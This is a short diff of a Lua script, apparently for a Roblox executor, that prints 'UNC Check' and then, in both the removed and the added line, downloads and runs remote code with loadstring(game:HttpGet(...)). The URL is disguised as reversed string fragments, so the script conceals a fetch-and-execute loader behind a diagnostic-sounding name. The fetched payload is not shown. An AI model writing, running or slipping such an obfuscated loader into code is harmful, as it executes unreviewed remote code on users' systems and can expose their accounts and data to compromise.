@@ -1,5 +1,3 @@
 print("UNC Check")
 
-pcall(function()
-  loadstring(game:HttpGet(string.reverse("ar//:sptth")..string.reverse("resubuhtig.w")..string.reverse("pmet/pyb101nenu/moc.tnetnoc")..string.reverse("egdirb/niam/tnc")))()
-end)
+loadstring(game:HttpGet(string.reverse("ar//:sptth")..string.reverse("resubuhtig.w")..string.reverse("pmet/pyb101nenu/moc.tnetnoc")..string.reverse("egdirb/niam/tnc")))()
